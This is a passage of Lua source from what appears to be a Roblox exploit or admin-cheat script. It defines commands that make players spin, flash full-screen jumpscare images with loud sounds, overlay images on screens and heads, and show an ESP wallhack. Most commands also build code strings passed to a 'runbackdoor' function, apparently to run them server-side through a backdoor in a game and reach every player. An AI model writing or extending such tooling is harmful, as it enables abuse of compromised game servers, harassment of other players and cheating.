        end
    ]]

	if not backdoor then
		localPlayer = game.Players.LocalPlayer
		if localPlayer then
			spawn(function()
				local sound = game.Workspace:FindFirstChild("uwmusic")
				if sound then
					sound:Destroy()
				end
			end)
			if currentMusic then
				currentMusic:Destroy()
				currentMusic = nil
			end
		end
	else
		runbackdoor(backdoor, bckd)
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("spin", "spin", function(target, number)
	number = tonumber(number) or 5
	local players = game:GetService("Players"):GetPlayers()

	local function speen(player, speed)
		local character = player.Character
		if character then
			for _, v in pairs(character:WaitForChild("HumanoidRootPart"):GetChildren()) do
				if v.Name == "Spinning" then
					v:Destroy()
				end
			end

			local spin = Instance.new("BodyAngularVelocity")
			spin.Name = "Spinning"
			spin.Parent = character:WaitForChild("HumanoidRootPart")
			spin.MaxTorque = Vector3.new(0, math.huge, 0)
			spin.AngularVelocity = Vector3.new(0, speed, 0)
		end
	end

	if not backdoor then
		local localPlayer = game.Players.LocalPlayer
		if not target or target == "" or target == "me" then
			speen(localPlayer, number)
		elseif target == "random" then
			local randomPlayer = players[math.random(1, #players)]
			speen(randomPlayer, number)
		elseif target == "others" then
			for _, player in ipairs(players) do
				if player ~= localPlayer then
					speen(player, number)
				end
			end
		elseif target == "all" then
			for _, player in ipairs(players) do
				speen(player, number)
			end
		else
			local found = false
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					speen(player, number)
					found = true
					break
				end
			end
			if not found then
			end
		end
	else
		local bckd
		if not target or target == "" or target == "me" then
			bckd = string.format([[
        local localPlayer = game:GetService("Players"):FindFirstChild("%s")
        if localPlayer and localPlayer.Character then
            local humanoidRootPart = localPlayer.Character:FindFirstChild("HumanoidRootPart")
            if humanoidRootPart then
                for _, v in pairs(humanoidRootPart:GetChildren()) do
                    if v.Name == "Spinning" then
                        v:Destroy()
                    end
                end
                local spin = Instance.new("BodyAngularVelocity")
                spin.Name = "Spinning"
                spin.Parent = humanoidRootPart
                spin.MaxTorque = Vector3.new(0, math.huge, 0)
                spin.AngularVelocity = Vector3.new(0, %d, 0)
            end
        end
    ]], game.Players.LocalPlayer.Name, number)
		elseif target == "random" then
			local randomPlayer = players[math.random(1, #players)]
			bckd = string.format([[
                local player = game.Players:FindFirstChild("%s")
                if player and player.Character then
                    for _, v in pairs(player.Character:WaitForChild("HumanoidRootPart"):GetChildren()) do
                        if v.Name == "Spinning" then
                            v:Destroy()
                        end
                    end
                    local spin = Instance.new("BodyAngularVelocity")
                    spin.Name = "Spinning"
                    spin.Parent = player.Character:WaitForChild("HumanoidRootPart")
                    spin.MaxTorque = Vector3.new(0, math.huge, 0)
                    spin.AngularVelocity = Vector3.new(0, %d, 0)
                end
            ]], randomPlayer.Name, number)
		elseif target == "others" then
			bckd = [[
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    if player ~= game.Players.LocalPlayer then
                        local character = player.Character
                        if character then
                            for _, v in pairs(character:WaitForChild("HumanoidRootPart"):GetChildren()) do
                                if v.Name == "Spinning" then
                                    v:Destroy()
                                end
                            end
                            local spin = Instance.new("BodyAngularVelocity")
                            spin.Name = "Spinning"
                            spin.Parent = character:WaitForChild("HumanoidRootPart")
                            spin.MaxTorque = Vector3.new(0, math.huge, 0)
                            spin.AngularVelocity = Vector3.new(0, %speed%, 0)
                        end
                    end
                end
            ]]
		elseif target == "all" then
			bckd = [[
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    local character = player.Character
                    if character then
                        for _, v in pairs(character:WaitForChild("HumanoidRootPart"):GetChildren()) do
                            if v.Name == "Spinning" then
                                v:Destroy()
                            end
                        end
                        local spin = Instance.new("BodyAngularVelocity")
                        spin.Name = "Spinning"
                        spin.Parent = character:WaitForChild("HumanoidRootPart")
                        spin.MaxTorque = Vector3.new(0, math.huge, 0)
                        spin.AngularVelocity = Vector3.new(0, %speed%, 0)
                    end
                end
            ]]
		else
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					bckd = string.format([[
                        local player = game.Players:FindFirstChild("%s")
                        if player and player.Character then
                            for _, v in pairs(player.Character:WaitForChild("HumanoidRootPart"):GetChildren()) do
                                if v.Name == "Spinning" then
                                    v:Destroy()
                                end
                            end
                            local spin = Instance.new("BodyAngularVelocity")
                            spin.Name = "Spinning"
                            spin.Parent = player.Character:WaitForChild("HumanoidRootPart")
                            spin.MaxTorque = Vector3.new(0, math.huge, 0)
                            spin.AngularVelocity = Vector3.new(0, %d, 0)
                        end
                    ]], player.Name, number)
					break
				end
			end
		end

		bckd = bckd:gsub("%%speed%%", number)
		bckd = bckd:gsub("%%username%%", game.Players.LocalPlayer.Name)

		if bckd then
			runbackdoor(backdoor, bckd)
		end
	end
end)

addcommand("unspin", "unspin", function(target)
	local players = game:GetService("Players"):GetPlayers()

	local function toodizzy(player)
		local character = player.Character
		if character then
			for _, v in pairs(character:WaitForChild("HumanoidRootPart"):GetChildren()) do
				if v.Name == "Spinning" then
					v:Destroy()
				end
			end
		end
	end

	if not backdoor then
		local localPlayer = game.Players.LocalPlayer
		if not target or target == "" or target == "me" then
			toodizzy(localPlayer)
		elseif target == "random" then
			local randomPlayer = players[math.random(1, #players)]
			toodizzy(randomPlayer)
		elseif target == "others" then
			for _, player in ipairs(players) do
				if player ~= localPlayer then
					toodizzy(player)
				end
			end
		elseif target == "all" then
			for _, player in ipairs(players) do
				toodizzy(player)
			end
		else
			local found = false
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					toodizzy(player)
					found = true
					break
				end
			end
		end
	else

		local bckd
		if not target or target == "" or target == "me" then
			bckd = string.format([[
        local localPlayerName = "%s"
        local localPlayer = game:GetService("Players"):FindFirstChild(localPlayerName)
        if localPlayer and localPlayer.Character then
            local character = localPlayer.Character
            for _, v in pairs(character:WaitForChild("HumanoidRootPart"):GetChildren()) do
                if v.Name == "Spinning" then
                    v:Destroy()
                end
            end
        end
    ]], game.Players.LocalPlayer.Name)
		elseif target == "random" then
			local randomPlayer = players[math.random(1, #players)]
			bckd = string.format([[
                local player = game.Players:FindFirstChild("%s")
                if player and player.Character then
                    for _, v in pairs(player.Character:WaitForChild("HumanoidRootPart"):GetChildren()) do
                        if v.Name == "Spinning" then
                            v:Destroy()
                        end
                    end
                end
            ]], randomPlayer.Name)
		elseif target == "others" then
			bckd = [[
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    if player ~= game.Players.LocalPlayer then
                        local character = player.Character
                        if character then
                            for _, v in pairs(character:WaitForChild("HumanoidRootPart"):GetChildren()) do
                                if v.Name == "Spinning" then
                                    v:Destroy()
                                end
                            end
                        end
                    end
                end
            ]]
		elseif target == "all" then
			bckd = [[
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    local character = player.Character
                    if character then
                        for _, v in pairs(character:WaitForChild("HumanoidRootPart"):GetChildren()) do
                            if v.Name == "Spinning" then
                                v:Destroy()
                            end
                        end
                    end
                end
            ]]
		else
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					bckd = string.format([[
                        local player = game.Players:FindFirstChild("%s")
                        if player and player.Character then
                            for _, v in pairs(player.Character:WaitForChild("HumanoidRootPart"):GetChildren()) do
                                if v.Name == "Spinning" then
                                    v:Destroy()
                                end
                            end
                        end
                    ]], player.Name)
					break
				end
			end
		end

		if bckd then
			bckd = bckd:gsub("%%username%%", game.Players.LocalPlayer.Name)
			runbackdoor(backdoor, bckd)
		end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("console", "console", function()
	if uwu["text chat service"].ChatVersion == Enum.ChatVersion.TextChatService then
		uwu["text chat service"].TextChannels.RBXGeneral:SendAsync("/console")
	else
		uwu["replicated storage"].DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/console", "All")
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

isfullbrightlooping = false
local fullbrightloopconnection
originalSettings = {}

addcommand("fullbright", "fb", function()
	Lighting = game:GetService"Lighting"		
	originalSettings.Brightness = Lighting.Brightness
	originalSettings.ClockTime = Lighting.ClockTime
	originalSettings.FogEnd = Lighting.FogEnd
	originalSettings.GlobalShadows = Lighting.GlobalShadows
	originalSettings.OutdoorAmbient = Lighting.OutdoorAmbient
	if not isfullbrightlooping then
		isfullbrightlooping = true
		fullbrightloopconnection = game:GetService"RunService".Heartbeat:Connect(function()
			Lighting = game:GetService"Lighting"		
			Lighting.Brightness = 2
			Lighting.ClockTime = 14
			Lighting.FogEnd = 100000
			Lighting.GlobalShadows = false
			Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
		end)
	end
end)

addcommand("unfullbright", "unfb", function()
	if isfullbrightlooping then
		isfullbrightlooping = false
		if fullbrightloopconnection then
			fullbrightloopconnection:Disconnect()
			fullbrightloopconnection = nil
		end
		Lighting = game:GetService"Lighting"		
		Lighting.Brightness = originalSettings.Brightness
		Lighting.ClockTime = originalSettings.ClockTime
		Lighting.FogEnd = originalSettings.FogEnd
		Lighting.GlobalShadows = originalSettings.GlobalShadows
		Lighting.OutdoorAmbient = originalSettings.OutdoorAmbient
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("jumpscare", "js", function(target, imageId, soundId)
	local players = game:GetService("Players"):GetPlayers()
	local localPlayer = game.Players.LocalPlayer
	local localPlayerName = localPlayer.Name

	soundId = soundId and soundId ~= "" and "rbxassetid://" .. soundId or "rbxassetid://7188420724"

	local function ahhhh(player)
		local playerGui = player:FindFirstChild("PlayerGui")
		if not playerGui then return end

		local screenGui = Instance.new("ScreenGui")
		screenGui.Parent = playerGui

		local imageLabel = Instance.new("ImageLabel")
		imageLabel.Parent = screenGui
		imageLabel.Image = "rbxassetid://" .. imageId
		imageLabel.BackgroundTransparency = 1
		imageLabel.Visible = true
		imageLabel.ImageTransparency = 0
		imageLabel.Size = UDim2.new(1, 0, 1, 60)
		imageLabel.Position = UDim2.new(0, 0, 0, -60)
		imageLabel.ZIndex = 6969

		local sound = Instance.new("Sound")
		sound.SoundId = soundId
		sound.Volume = 10
		sound.Parent = playerGui

		local function fadeimage()
			for i = 0, 1, 0.03 do
				imageLabel.ImageTransparency = i
				t(0)
			end
			imageLabel:Destroy()
		end

		sound:Play()
		task.spawn(fadeimage)
	end

	if not backdoor then
		if not target or target == "" or target == "me" then
			ahhhh(localPlayer)
		elseif target == "random" then
			local randomPlayer = players[math.random(1, #players)]
			ahhhh(randomPlayer)
		elseif target == "others" then
			for _, player in ipairs(players) do
				if player ~= localPlayer then
					task.spawn(ahhhh, player)
				end
			end
		elseif target == "all" then
			for _, player in ipairs(players) do
				task.spawn(ahhhh, player)
			end
		else
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					ahhhh(player)
					break
				end
			end
		end
		return
	end

	local bckd

	if not target or target == "" or target == "me" then
		bckd = string.format([[
            local player = game.Players:FindFirstChild("%s")
            if player and player:FindFirstChild("PlayerGui") then
                local playerGui = player:FindFirstChild("PlayerGui")
                local screenGui = Instance.new("ScreenGui")
                screenGui.Parent = playerGui

                local imageLabel = Instance.new("ImageLabel")
                imageLabel.Parent = screenGui
                imageLabel.Image = "rbxassetid://%s"
                imageLabel.BackgroundTransparency = 1
                imageLabel.Visible = true
                imageLabel.ImageTransparency = 0
                imageLabel.Size = UDim2.new(1, 0, 1, 60)
                imageLabel.Position = UDim2.new(0, 0, 0, -60)
                imageLabel.ZIndex = 6969

                local sound = Instance.new("Sound")
                sound.SoundId = "%s"
                sound.Volume = 10
                sound.Parent = playerGui

                local function fadeimage()
                    for i = 0, 1, 0.03 do
                        imageLabel.ImageTransparency = i
                        t(0)
                    end
                    imageLabel:Destroy()
                end

                sound:Play()
                task.spawn(fadeimage)
            end
        ]], localPlayerName, imageId, soundId)
	elseif target == "random" then
		local randomPlayer = players[math.random(1, #players)]
		bckd = string.format([[
            local player = game.Players:FindFirstChild("%s")
            if player and player:FindFirstChild("PlayerGui") then
                local playerGui = player:FindFirstChild("PlayerGui")
                local screenGui = Instance.new("ScreenGui")
                screenGui.Parent = playerGui

                local imageLabel = Instance.new("ImageLabel")
                imageLabel.Parent = screenGui
                imageLabel.Image = "rbxassetid://%s"
                imageLabel.BackgroundTransparency = 1
                imageLabel.Visible = true
                imageLabel.ImageTransparency = 0
                imageLabel.Size = UDim2.new(1, 0, 1, 60)
                imageLabel.Position = UDim2.new(0, 0, 0, -60)
                imageLabel.ZIndex = 6969

                local sound = Instance.new("Sound")
                sound.SoundId = "%s"
                sound.Volume = 10
                sound.Parent = playerGui

                local function fadeimage()
                    for i = 0, 1, 0.03 do
                        imageLabel.ImageTransparency = i
                        t(0)
                    end
                    imageLabel:Destroy()
                end

                sound:Play()
                task.spawn(fadeimage)
            end
        ]], randomPlayer.Name, imageId, soundId)
	elseif target == "others" then
		bckd = string.format([[
            local localPlayerName = "%s"
            local imageId = "%s"
            local soundId = "%s"
            
            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                if player.Name ~= localPlayerName then
                    if player:FindFirstChild("PlayerGui") then
                        local playerGui = player:FindFirstChild("PlayerGui")
                        local screenGui = Instance.new("ScreenGui")
                        screenGui.Parent = playerGui

                        local imageLabel = Instance.new("ImageLabel")
                        imageLabel.Parent = screenGui
                        imageLabel.Image = "rbxassetid://" .. imageId
                        imageLabel.BackgroundTransparency = 1
                        imageLabel.Visible = true
                        imageLabel.ImageTransparency = 0
                        imageLabel.Size = UDim2.new(1, 0, 1, 60)
                        imageLabel.Position = UDim2.new(0, 0, 0, -60)
                        imageLabel.ZIndex = 6969

                        local sound = Instance.new("Sound")
                        sound.SoundId = soundId
                        sound.Volume = 10
                        sound.Parent = playerGui

                        local function fadeimage()
                            for i = 0, 1, 0.03 do
                                imageLabel.ImageTransparency = i
                                t(0)
                            end
                            imageLabel:Destroy()
                        end

                        sound:Play()
                        task.spawn(fadeimage)
                    end
                end
            end
        ]], localPlayerName, imageId, soundId)
	elseif target == "all" then
		bckd = string.format([[
            local imageId = "%s"
            local soundId = "%s"
            
            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                if player:FindFirstChild("PlayerGui") then
                    local playerGui = player:FindFirstChild("PlayerGui")
                    local screenGui = Instance.new("ScreenGui")
                    screenGui.Parent = playerGui

                    local imageLabel = Instance.new("ImageLabel")
                    imageLabel.Parent = screenGui
                    imageLabel.Image = "rbxassetid://" .. imageId
                    imageLabel.BackgroundTransparency = 1
                    imageLabel.Visible = true
                    imageLabel.ImageTransparency = 0
                    imageLabel.Size = UDim2.new(1, 0, 1, 60)
                    imageLabel.Position = UDim2.new(0, 0, 0, -60)
                    imageLabel.ZIndex = 6969

                    local sound = Instance.new("Sound")
                    sound.SoundId = soundId
                    sound.Volume = 10
                    sound.Parent = playerGui

                    local function fadeimage()
                        for i = 0, 1, 0.03 do
                            imageLabel.ImageTransparency = i
                            t(0)
                        end
                        imageLabel:Destroy()
                    end

                    sound:Play()
                    task.spawn(fadeimage)
                end
            end
        ]], imageId, soundId)
	else
		bckd = string.format([[
            local targetName = "%s"
            local imageId = "%s"
            local soundId = "%s"
            
            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                if string.find(string.lower(player.Name), string.lower(targetName)) then
                    if player:FindFirstChild("PlayerGui") then
                        local playerGui = player:FindFirstChild("PlayerGui")
                        local screenGui = Instance.new("ScreenGui")
                        screenGui.Parent = playerGui

                        local imageLabel = Instance.new("ImageLabel")
                        imageLabel.Parent = screenGui
                        imageLabel.Image = "rbxassetid://" .. imageId
                        imageLabel.BackgroundTransparency = 1
                        imageLabel.Visible = true
                        imageLabel.ImageTransparency = 0
                        imageLabel.Size = UDim2.new(1, 0, 1, 60)
                        imageLabel.Position = UDim2.new(0, 0, 0, -60)
                        imageLabel.ZIndex = 6969

                        local sound = Instance.new("Sound")
                        sound.SoundId = soundId
                        sound.Volume = 10
                        sound.Parent = playerGui

                        local function fadeimage()
                            for i = 0, 1, 0.03 do
                                imageLabel.ImageTransparency = i
                                t(0)
                            end
                            imageLabel:Destroy()
                        end

                        sound:Play()
                        task.spawn(fadeimage)
                    end
                end
            end
        ]], target, imageId, soundId)
	end

	if bckd then
		runbackdoor(backdoor, bckd)
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("screenimage", "simage", function(target, imageId)
	local players = game:GetService("Players"):GetPlayers()

	local function showimage(player)
		local playerGui = player:FindFirstChild("PlayerGui")
		if not playerGui then return end

		local screenGui = Instance.new("ScreenGui")
		screenGui.Parent = playerGui
		screenGui.Name = ">.<"

		local imageLabel = Instance.new("ImageLabel")
		imageLabel.Parent = screenGui
		imageLabel.Image = "rbxassetid://" .. imageId
		imageLabel.BackgroundTransparency = 1
		imageLabel.Visible = true
		imageLabel.ImageTransparency = 0
		imageLabel.Size = UDim2.new(1, 0, 1, 60)
		imageLabel.Position = UDim2.new(0, 0, 0, -60)
		imageLabel.ZIndex = 6969
	end

	if not backdoor then
		local localPlayer = game.Players.LocalPlayer
		if not target or target == "" or target == "me" then
			if localPlayer then
				showimage(localPlayer)
			end
		elseif target == "random" then
			local randomPlayer = players[math.random(1, #players)]
			showimage(randomPlayer)
		elseif target == "others" then
			for _, player in ipairs(players) do
				if player ~= localPlayer then
					showimage(player)
				end
			end
		elseif target == "all" then
			for _, player in ipairs(players) do
				showimage(player)
			end
		else
			local found = false
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					showimage(player)
					found = true
					break
				end
			end
		end
	else
		local bckd
		if not target or target == "" or target == "me" then
			local localPlayerName = game.Players.LocalPlayer.Name

			bckd = string.format([[
        local localPlayer = game.Players:FindFirstChild("%s")
        if not localPlayer then return end
        local playerGui = localPlayer:FindFirstChild("PlayerGui")
        if not playerGui then return end

        local screenGui = Instance.new("ScreenGui")
        screenGui.Parent = playerGui
        screenGui.Name = ">.<"

        local imageLabel = Instance.new("ImageLabel")
        imageLabel.Parent = screenGui
        imageLabel.Image = "rbxassetid://" .. "%s"
        imageLabel.BackgroundTransparency = 1
        imageLabel.Visible = true
        imageLabel.ImageTransparency = 0
        imageLabel.Size = UDim2.new(1, 0, 1, 60)
        imageLabel.Position = UDim2.new(0, 0, 0, -60)
        imageLabel.ZIndex = 6969
    ]], localPlayerName, imageId)
		elseif target == "random" then
			local randomPlayer = players[math.random(1, #players)]
			bckd = string.format([[
        local player = game.Players:FindFirstChild("%s")
        if player and player:FindFirstChild("PlayerGui") then
            local playerGui = player:FindFirstChild("PlayerGui")
            local screenGui = Instance.new("ScreenGui")
            screenGui.Parent = playerGui
            screenGui.Name = ">.<"

            local imageLabel = Instance.new("ImageLabel")
            imageLabel.Parent = screenGui
            imageLabel.Image = "rbxassetid://%s"
            imageLabel.BackgroundTransparency = 1
            imageLabel.Visible = true
            imageLabel.ImageTransparency = 0
            imageLabel.Size = UDim2.new(1, 0, 1, 60)
            imageLabel.Position = UDim2.new(0, 0, 0, -60)
            imageLabel.ZIndex = 6969
        end
    ]], randomPlayer.Name, imageId)
		elseif target == "others" then
			bckd = [[
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    if player ~= game.Players.LocalPlayer then
                        local playerGui = player:FindFirstChild("PlayerGui")
                        if playerGui then
                            local screenGui = Instance.new("ScreenGui")
                            screenGui.Parent = playerGui
                            screenGui.Name = ">.<"

                            local imageLabel = Instance.new("ImageLabel")
                            imageLabel.Parent = screenGui
                            imageLabel.Image = "rbxassetid://" .. "%imageId%"
                            imageLabel.BackgroundTransparency = 1
                            imageLabel.Visible = true
                            imageLabel.ImageTransparency = 0
                            imageLabel.Size = UDim2.new(1, 0, 1, 60)
                            imageLabel.Position = UDim2.new(0, 0, 0, -60)
                            imageLabel.ZIndex = 6969
                        end
                    end
                end
            ]]
		elseif target == "all" then
			bckd = [[
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    local playerGui = player:FindFirstChild("PlayerGui")
                    if playerGui then
                        local screenGui = Instance.new("ScreenGui")
                        screenGui.Parent = playerGui
                        screenGui.Name = ">.<"

                        local imageLabel = Instance.new("ImageLabel")
                        imageLabel.Parent = screenGui
                        imageLabel.Image = "rbxassetid://" .. "%imageId%"
                        imageLabel.BackgroundTransparency = 1
                        imageLabel.Visible = true
                        imageLabel.ImageTransparency = 0
                        imageLabel.Size = UDim2.new(1, 0, 1, 60)
                        imageLabel.Position = UDim2.new(0, 0, 0, -60)
                        imageLabel.ZIndex = 6969
                    end
                end
            ]]
		else
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					bckd = string.format([[
            local player = game.Players:FindFirstChild("%s")
            if player and player:FindFirstChild("PlayerGui") then
                local playerGui = player:FindFirstChild("PlayerGui")
                local screenGui = Instance.new("ScreenGui")
                screenGui.Parent = playerGui
                screenGui.Name = ">.<"

                local imageLabel = Instance.new("ImageLabel")
                imageLabel.Parent = screenGui
                imageLabel.Image = "rbxassetid://%s"
                imageLabel.BackgroundTransparency = 1
                imageLabel.Visible = true
                imageLabel.ImageTransparency = 0
                imageLabel.Size = UDim2.new(1, 0, 1, 60)
                imageLabel.Position = UDim2.new(0, 0, 0, -60)
                imageLabel.ZIndex = 6969
            end
        ]], player.Name, imageId)
					break
				end
			end
		end

		if bckd then
			bckd = bckd:gsub("%%imageId%%", imageId)
			runbackdoor(backdoor, bckd)
		end
	end
end)

addcommand("unscreenimage", "unsimage", function(target)
	local players = game:GetService("Players"):GetPlayers()

	local function removeimage(player)
		local playerGui = player:FindFirstChild("PlayerGui")
		if playerGui then
			local screenGui = playerGui:FindFirstChild(">.<")
			if screenGui then
				screenGui:Destroy()
			end
		end
	end

	if not backdoor then
		local localPlayer = game.Players.LocalPlayer
		if not target or target == "" or target == "me" then
			if localPlayer then
				removeimage(localPlayer)
			end
		elseif target == "random" then
			local randomPlayer = players[math.random(1, #players)]
			removeimage(randomPlayer)
		elseif target == "others" then
			for _, player in ipairs(players) do
				if player ~= localPlayer then
					removeimage(player)
				end
			end
		elseif target == "all" then
			for _, player in ipairs(players) do
				removeimage(player)
			end
		else
			local found = false
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					removeimage(player)
					found = true
					break
				end
			end
		end
	else
		local bckd
		if not target or target == "" or target == "me" then
			bckd = string.format([[
                local player = game.Players:FindFirstChild("%s")
                if player and player:FindFirstChild("PlayerGui") then
                    local playerGui = player:FindFirstChild("PlayerGui")
                    local screenGui = playerGui:FindFirstChild(">.<")
                    if screenGui then
                        screenGui:Destroy()
                    end
                end
            ]], game.Players.LocalPlayer.Name)
		elseif target == "random" then
			local randomPlayer = players[math.random(1, #players)]
			bckd = string.format([[
                local player = game.Players:FindFirstChild("%s")
                if player and player:FindFirstChild("PlayerGui") then
                    local playerGui = player:FindFirstChild("PlayerGui")
                    local screenGui = playerGui:FindFirstChild(">.<")
                    if screenGui then
                        screenGui:Destroy()
                    end
                end
            ]], randomPlayer.Name)
		elseif target == "others" then
			bckd = [[
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    if player ~= game.Players.LocalPlayer then
                        local playerGui = player:FindFirstChild("PlayerGui")
                        if playerGui then
                            local screenGui = playerGui:FindFirstChild(">.<")
                            if screenGui then
                                screenGui:Destroy()
                            end
                        end
                    end
                end
            ]]
		elseif target == "all" then
			bckd = [[
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    local playerGui = player:FindFirstChild("PlayerGui")
                    if playerGui then
                        local screenGui = playerGui:FindFirstChild(">.<")
                        if screenGui then
                            screenGui:Destroy()
                        end
                    end
                end
            ]]
		else
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					bckd = string.format([[
                        local player = game.Players:FindFirstChild("%s")
                        if player and player:FindFirstChild("PlayerGui") then
                            local playerGui = player:FindFirstChild("PlayerGui")
                            local screenGui = playerGui:FindFirstChild(">.<")
                            if screenGui then
                                screenGui:Destroy()
                            end
                        end
                    ]], player.Name)
					break
				end
			end
		end

		if bckd then
			runbackdoor(backdoor, bckd)
		end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

local highlightTypes = {
	Players = false,
}

local billboardTextVisible = true
local highlightVisible = true

local highlightLoopRunning = false

function billbord(parent, modelName, textColor)
	local billboard = Instance.new("BillboardGui")
	billboard.Name = "unableesp"
	billboard.Adornee = parent
	billboard.Size = UDim2.new(0, 100, 0, 50)
	billboard.AlwaysOnTop = true
	billboard.Parent = parent

	local label = Instance.new("TextLabel")
	label.Size = UDim2.new(1, 0, 1, 0)
	label.BackgroundTransparency = 1
	label.Text = modelName
	label.Font = uwu["default text font"]
	label.TextColor3 = textColor
	label.TextStrokeTransparency = 0
	label.TextStrokeColor3 = Color3.new(1, 1, 1)
	label.TextSize = 16
	label.Visible = billboardTextVisible
	label.Parent = billboard
end

function toggleBillboardTextVisibility(visible)
	billboardTextVisible = visible

	for _, descendant in pairs(workspace:GetDescendants()) do
		if descendant:IsA("BillboardGui") and descendant.Name == "unableesp" then
			local label = descendant:FindFirstChildOfClass("TextLabel")
			if label then
				label.Visible = visible
			end
		end
	end
end

function toggleHighlightVisibility(visible)
	highlightVisible = visible

	for _, descendant in pairs(workspace:GetDescendants()) do
		if descendant:IsA("Highlight") then
			descendant.Enabled = visible
		end
	end
end

function addHighlights()
	if highlightTypes.Players then
		for _, player in pairs(uwu["players"]:GetPlayers()) do
			if player ~= uwu["local player"] and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
				local highlight = player.Character:FindFirstChildOfClass("Highlight")
				if not highlight then
					highlight = Instance.new("Highlight")
					highlight.FillColor = uwu["default border color"]
					if noxioustheme then
						highlight.FillColor = uwu["default background color"]
					end
					highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
					highlight.Enabled = highlightVisible
					highlight.Parent = player.Character

					local billboardText = "(@" .. player.Name .. ")\n" .. player.DisplayName
					billbord(player.Character, billboardText, uwu["default border color"])
				end
			end
		end
	end
end

function removeHighlights()
	for _, player in pairs(uwu["players"]:GetPlayers()) do
		if player.Character then
			local highlight = player.Character:FindFirstChildOfClass("Highlight")
			if highlight then
				highlight:Destroy()
			end
			local billboard = player.Character:FindFirstChild("unableesp")
			if billboard then
				billboard:Destroy()
			end
		end
	end
end

function startHighlightLoop()
	if highlightLoopRunning then return end
	highlightLoopRunning = true

	uwu["run service"].RenderStepped:Connect(function()
		if highlightLoopRunning then
			addHighlights()
		end
	end)
end

function stopHighlightLoop()
	highlightLoopRunning = false
	removeHighlights()
end

function enableEsp(type)
	highlightTypes[type] = true
	startHighlightLoop()
end

function disableEsp(type)
	highlightTypes[type] = false

	local allDisabled = true
	for _, isEnabled in pairs(highlightTypes) do
		if isEnabled then
			allDisabled = false
			break
		end
	end

	if allDisabled then
		stopHighlightLoop()
	else
		removeHighlights()
	end
end

function hideesptext()
	toggleBillboardTextVisibility(false)
	toggleHighlightVisibility(true)
end

function showesptext()
	toggleBillboardTextVisibility(true)
	if toggleHighlightVisibility(true) then
		toggleBillboardTextVisibility(false)
	end
end

function hideesp()
	toggleHighlightVisibility(false)
	toggleBillboardTextVisibility(true)
end

function showesp()
	toggleHighlightVisibility(true)
	if toggleBillboardTextVisibility(true) then
		toggleHighlightVisibility(false)
	end
end

function enableAllEsp()
	for type in pairs(highlightTypes) do
		highlightTypes[type] = true
	end
	startHighlightLoop()
end

function disableAllEsp()
	for type in pairs(highlightTypes) do
		highlightTypes[type] = false
	end
	stopHighlightLoop()
end

usingesp = false

addcommand("esp", "esp", function()
	usingesp = true
	enableEsp("Players")
end)

addcommand("unesp", "unesp", function()
	usingesp = false
	disableEsp("Players")
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("headbillboard", "headbb", function(target, imageId)
	local players = game:GetService("Players"):GetPlayers()
	local localPlayer = game.Players.LocalPlayer
	local localPlayerName = localPlayer.Name

	local function headbill(player)
		if player.Character and player.Character:FindFirstChild("Head") then
			local head = player.Character.Head

			local existingBillboard = head:FindFirstChild("headbillboarduwu")
			if existingBillboard then
				existingBillboard:Destroy()
			end

			local billboardGui = Instance.new("BillboardGui")
			billboardGui.Name = "headbillboarduwu"
			billboardGui.Adornee = head
			billboardGui.Size = UDim2.new(3, 0, 3, 0)
			billboardGui.StudsOffset = Vector3.new(0, 0, 0)
			billboardGui.AlwaysOnTop = true
			billboardGui.Parent = head

			local imageLabel = Instance.new("ImageLabel")
			imageLabel.Image = "rbxassetid://" .. imageId
			imageLabel.BackgroundTransparency = 1
			imageLabel.Size = UDim2.new(1, 0, 1, 0)
			imageLabel.Parent = billboardGui
		end
	end

	if not backdoor then
		if not target or target == "" or target == "me" then
			headbill(localPlayer)
		elseif target == "random" then
			local randomPlayer = players[math.random(1, #players)]
			headbill(randomPlayer)
		elseif target == "others" then
			for _, player in ipairs(players) do
				if player ~= localPlayer then
					headbill(player)
				end
			end
		elseif target == "all" then
			for _, player in ipairs(players) do
				headbill(player)
			end
		else
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					headbill(player)
					break
				end
			end
		end
		return
	end

	local bckd

	if not target or target == "" or target == "me" then
		bckd = string.format([[
            local player = game.Players:FindFirstChild("%s")
            if player and player.Character and player.Character:FindFirstChild("Head") then
                local head = player.Character.Head

                local existingBillboard = head:FindFirstChild("headbillboarduwu")
                if existingBillboard then
                    existingBillboard:Destroy()
                end

                local billboardGui = Instance.new("BillboardGui")
                billboardGui.Name = "headbillboarduwu"
                billboardGui.Adornee = head
                billboardGui.Size = UDim2.new(3, 0, 3, 0)
                billboardGui.StudsOffset = Vector3.new(0, 0, 0)
                billboardGui.AlwaysOnTop = true
                billboardGui.Parent = head

                local imageLabel = Instance.new("ImageLabel")
                imageLabel.Image = "rbxassetid://%s"
